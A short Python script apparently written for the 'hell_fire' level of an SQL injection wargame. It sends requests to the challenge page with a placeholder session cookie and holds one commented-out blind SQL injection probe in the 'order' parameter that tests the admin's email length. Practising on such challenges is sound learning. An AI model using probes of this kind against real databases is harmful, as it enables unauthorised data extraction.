import urllib3
import requests

url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?"
header = {"Cookie":"PHPSESSID=YOUR COOKIE VALUE"} #본인의 cookie 값을 코드에 입력

#query = "order=length(email)={},id=%27admin%27".format(28)
query = "order=id"
req = requests.get(url+query, headers=header)
print(url+query)

print(req.text)
